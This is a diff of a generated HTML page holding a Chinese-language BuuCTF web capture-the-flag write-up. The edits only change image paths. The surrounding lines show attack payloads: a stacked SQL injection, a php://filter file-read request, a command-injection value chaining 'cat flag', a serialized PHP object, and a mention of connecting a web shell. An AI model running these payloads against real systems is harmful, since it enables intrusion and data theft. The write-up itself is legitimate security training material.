@@ -393,7 +393,7 @@ flag not here, and flag in ffffllllaaaagggg</code></pre>
 return : return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre>
 <p>测试中发现存在堆叠注入，查询当前数据库表结构，发现flag列名</p>
 <pre><code>payload: ?inject=&#39;;show tables;desc `1919810931114514`;desc words;</code></pre>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86.htm/image-20200801190203955.png" alt="image-20200801190203955"></p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/image-20200801190203955.png" alt="image-20200801190203955"></p>
 <h2 id="MySQL数据表命名细节"><a href="#MySQL数据表命名细节" class="headerlink" title="MySQL数据表命名细节"></a>MySQL数据表命名细节</h2><p><strong>下列代码中A用全数字做表名，在使用时需要用反引号包裹，不然会产生错误，但如果半数字半字符或全字符则不需要</strong></p>
 <pre><code class="mysql">测试表的结构如下
 MariaDB [test]&gt; desc `1919810931114514`;  --A
@@ -759,7 +759,7 @@ foo_bar{chr} -&gt; 3d (=)</code></pre>
 <pre><code>/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre>
 <p>对输出的base64密文进行解密即可</p>
 <h2 id="0x01-php-filter"><a href="#0x01-php-filter" class="headerlink" title="0x01 php://filter"></a>0x01 php://filter</h2><p>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取</p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86.htm/image-20200727161155342.png" alt="image-20200727161155342"></p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/image-20200727161155342.png" alt="image-20200727161155342"></p>
 <h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p><strong>解题思路</strong></p>
 <p>猜测后台代码如下</p>
 <pre><code class="php">$sql = SELECT * DROM database WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;;</code></pre>
@@ -828,7 +828,7 @@ if(isset($_GET[&#39;ip&#39;])){
 <pre><code>python3 dirsearch.py -u url -e php
 -u url
 -e 网站语言</code></pre>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86.htm/image-20200727184803212.png" alt="image-20200727184803212"></p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/image-20200727184803212.png" alt="image-20200727184803212"></p>
 <p>下载<code>/www.zip</code></p>
 <p><strong>代码审计</strong></p>
 <pre><code class="php">----index.php
@@ -901,7 +901,7 @@ O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin
 <p>蚁剑连接</p>
 <h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p><strong>解题方法</strong></p>
 <p>查看源码，访问<code>Secret.php</code>，会连续出现三个要求，设置http头即可</p>
-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86.htm/image-20200727192826010.png" alt="image-20200727192826010"></p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/image-20200727192826010.png" alt="image-20200727192826010"></p>
 <h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p><strong>解题方法</strong></p>
 <pre><code>target=;cd ..;cd ..;cd ..;cat flag</code></pre>
 <h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p><strong>解题思路</strong></p>
